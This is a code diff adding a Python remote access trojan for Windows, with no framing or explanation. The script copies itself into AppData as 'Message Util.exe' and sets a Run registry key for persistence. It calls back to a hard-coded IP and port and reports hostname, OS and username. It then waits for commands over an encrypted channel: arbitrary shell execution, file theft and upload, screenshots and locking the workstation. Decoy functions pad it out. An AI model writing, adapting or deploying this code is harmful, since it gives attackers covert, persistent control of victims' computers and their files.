@@ -1,0 +1,166 @@
+import subprocess
+import os
+import time
+import socket
+import shutil as sh
+import json as js
+import sys
+import pyscreeze as pys
+import platform
+import ctypes as ct
+from io import BytesIO
+from cryptography.fernet import Fernet
+
+time.sleep(20)
+def initial():
+    x = 10
+    y = 20
+
+    def _secret_function():
+        return x * y
+
+    _mysterious_var_1 = "Nothing to see here"
+    _mysterious_var_2 = "Move along, pal"
+    print("You see me!")
+
+def stent():
+    _files = os.environ["appdata"] + "\\Message Util.exe"
+    if not os.path.exists(_files):
+        sh.copyfile(sys.executable, _files)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v lolo /t REG_SZ /d "' + _files + '"', shell=True)
+HOST = "192.168.43.72"
+PORT = 5566
+BUFF = 1024
+def connect():
+    global dmzSocket, dmzEncryptor
+    while True:
+        try:
+            dmzSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            dmzSocket.connect((HOST, PORT))
+        except socket.error:
+            time.sleep(5)
+        else:
+            break
+def send_client():
+    global dmzEncryptor, dmzSocket
+    itsinfo = [socket.gethostname()]
+    textform = f"{platform.system()} {platform.release()}"
+    itsinfo.extend([textform, os.environ["USERNAME"]])
+    dmzSocket.send(js.dumps(itsinfo).encode())
+    dmzEncryptor = Fernet(dmzSocket.recv(BUFF))
+try:
+    recv = lambda buffer: dmzEncryptor.decrypt(dmzSocket.recv(buffer))
+    send = lambda data: dmzSocket.send(dmzEncryptor.encrypt(data))
+except Exception:
+    pass
+def recvall(buffer):
+    bytData = b""
+    while len(bytData) < buffer:
+        bytData += dmzSocket.recv(buffer)
+    return dmzEncryptor.decrypt(bytData)
+def sendall(data):
+    bytEncryptedData = dmzEncryptor.encrypt(data)
+    intDataSize = len(bytEncryptedData)
+    send(str(intDataSize).encode())
+    time.sleep(0.2)
+    dmzSocket.send(bytEncryptedData)
+def receive(data):
+    if not os.path.isfile(data):
+        send(b"[-] Target file not found!")
+        return
+    with open(data, "rb") as objFile:
+        sendall(objFile.read())
+
+def inital2():
+    x = 10
+    y = 20
+
+    def unused_function():
+        return x + y
+    unused_variable_1 = "Hello"
+    unused_variable_2 = "World"
+
+    print("Hello, World!")
+def download(data):
+    intBuffer = int(data)
+    file_data = recvall(intBuffer)
+    strOutputFile = recv(BUFF).decode()
+    print(strOutputFile)
+    try:
+        with open(strOutputFile, "wb") as objFile:
+            objFile.write(file_data)
+        response = "[+] Done!".encode()
+    except Exception as e:
+        print(e)
+        response = "[-] Path is protected/invalid!".encode()
+    return response
+def upload(data):
+    response = b""
+    if not os.path.isfile(data):
+        response = b"[-] Target file not found!"
+    else:
+        with open(data, "rb") as objFile:
+            response = (objFile.read())  # Send Contents of File
+    return response
+def lock():
+    ct.windll.user32.LockWorkStation()
+    response = b"[+] Locked!"
+    return response
+def scree():
+    image = pys.screenshot()
+    with BytesIO() as objBytes:
+        image.save(objBytes, format="PNG")
+        sSs = objBytes.getvalue()
+    return sSs
+def run():
+    while True:
+        textcurdir = os.getcwd()
+        amr = recv(BUFF).decode()
+        print(amr)
+        btres = b""
+        try:
+            if amr == "goback":
+                os.chdir(textcurdir)
+                btres = f"\n{os.getcwd()}>".encode()
+            elif amr == "exit" or amr == "quit":
+                send("[+] Process is being terminated...")
+                time.sleep(3)
+                #objSocket.close()
+            elif amr[:2] == "cd":
+                if os.path.exists(amr[3:]):
+                    os.chdir(amr[3:])
+                    btres = f"[+] Changing working directory to {os.getcwd()}>".encode(
+                    )
+                else:
+                    btres = "[-] Path not found!".encode()
+
+            elif amr[:4] == "send":
+                btres = download(amr[4:])
+            elif amr[:4] == "recv":
+                btres = upload(amr[4:])
+            elif amr[:4] == "lock":
+                btres = lock()
+            elif amr == "screenshot":
+                btres = scree()
+            elif len(amr) > 0:
+                objCommand = subprocess.Popen(
+                    amr, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+                strOutput = objCommand.stdout.read() + objCommand.stderr.read()
+                btres = strOutput
+            else:
+                btres = b"[-] Error!"
+            if not amr == "keylogger":
+                sendall(btres)
+        except Exception:
+            btres = "[`] AND ERROR HAS OCCURED".encode()
+def main():
+    try:
+        initial()
+        stent()
+        connect()
+        inital2()
+        send_client()
+        run()
+    except Exception:
+        main()
+main()
